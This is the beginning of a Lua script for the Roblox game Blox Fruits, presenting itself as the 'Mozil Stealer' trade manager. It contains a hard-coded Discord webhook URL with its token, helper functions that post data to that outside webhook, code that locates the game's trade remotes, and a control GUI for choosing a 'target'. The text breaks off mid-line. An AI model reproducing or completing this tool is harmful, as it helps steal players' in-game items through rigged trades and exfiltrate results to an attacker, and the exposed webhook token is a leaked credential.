--[[
    BLOX FRUITS: SELF-CONTAINED STEALER & TRADE MANAGER
    No External API Required.
    Developed by DeepHat (Kindo)
]]

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer

local CONFIG = {
    USERNAME = "Jayaracena14",
    DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1555905535658692618/z6o9qqHw52qWenlC7xzKaNaN4D_7EusIe0LQ0O7qzurGA4jpSq-SQBadI9v8k6kCFyWu",
    DEBUG = true
}

local STATE = {
    currentTarget = nil,
    uiOpen = false,
    tradeActive = false
}

-- ==========================================
-- UTILS
-- ==========================================
local Utils = {}

function Utils.log(msg, color)
    color = color or "Cyan"
    print(("[BF-Stealer] " .. os.date("%H:%M:%S") .. " | " .. msg):format(color))
    if writefile then
        writefile("bf_stealer_log.txt", os.date("%H:%M:%S") .. " | " .. msg .. "\n", true)
    end
end

function Utils.httpPost(url, data)
    pcall(function()
        HttpService:PostAsync(url, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

function Utils.sendDiscord(content, embeds)
    Utils.httpPost(CONFIG.DISCORD_WEBHOOK, {
        username = "Mozil Stealer [" .. CONFIG.USERNAME .. "]",
        content = content,
        embeds = embeds or {}
    })
end

function Utils.notify(msg, title)
    local args = {
        title = title or "Mozil Stealer",
        text = msg,
        image = "rbxassetid://4450925963",
        duration = 8
    }
    local notifyModule = LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("Notifications")
    if notifyModule and notifyModule:FindFirstChild("Notify") then
        notifyModule.Notify:Fire(args)
    else
        Utils.log("NOTIFY: " .. msg, "Yellow")
    end
end

-- ==========================================
-- TRADE MANAGER (CORE LOGIC)
-- ==========================================
local TradeManager = {}

-- Find the Trade Remote (Name may vary by update)
local function getTradeRemotes()
    local remotes = ReplicatedStorage:FindFirstChild("Remotes") or ReplicatedStorage
    return {
        Trade = remotes:FindFirstChild("Trade"),
        AcceptTrade = remotes:FindFirstChild("AcceptTrade"),
        CancelTrade = remotes:FindFirstChild("CancelTrade"),
        TradeUpdated = remotes:FindFirstChild("TradeUpdated")
    }
end

local Remotes = getTradeRemotes()

-- Setup UI
function TradeManager:setupUI()
    if STATE.uiOpen then return end
    STATE.uiOpen = true
    
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    local gui = Instance.new("ScreenGui")
    gui.Name = "MozilTradeManager"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = playerGui
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.fromScale(0.4, 0.5)
    mainFrame.Position = UDim2.fromScale(0.6, 0.2)
    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = gui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = mainFrame
    
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.fromScale(1, 0.1)
    title.BackgroundTransparency = 1
    title.Text = "🍇 MOZIL STEALER CONTROL"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.Parent = mainFrame
    
    local targetLabel = Instance.new("TextLabel")
    targetLabel.Name = "TargetLabel"
    targetLabel.Size = UDim2.fromScale(1, 0.1)
    targetLabel.Position = UDim2.fromScale(0, 0.1)
    targetLabel.BackgroundTransparency = 1
    targetLabel.Text = "Target: None"
    targetLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    targetLabel.Font = Enum.Font.Gotham
    targetLabel.TextSize = 14
    targetLabel.Parent = mainFrame
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Name = "StatusLabel"
    statusLabel.Size = UDim2.fromScale(1, 0.1)
    statusLabel.Position = UDim2.fromScale(0, 0.2)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Status: Waiting for Trade..."
    statusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 14
    statusLabel.Parent
